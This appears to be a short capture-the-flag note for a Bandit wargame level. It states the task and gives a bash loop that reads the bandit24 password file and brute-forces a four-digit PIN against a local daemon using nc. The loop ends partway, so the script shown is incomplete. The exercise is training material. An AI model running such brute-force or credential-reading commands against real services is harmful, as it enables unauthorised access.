Task:
    A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
    
Command:
    password24=$(cat /etc/bandit_pass/bandit24)
    for w in {0..9}
    do 
        for x in {0..9}
        do 
            for y in {0..9}
            do 
                for z in {0..9}
                do 
                    echo "pin: $w$x$y$z"
                    echo "$password24 $w$x$y$z" | timeout 1 nc localhost 30002
                done
            done
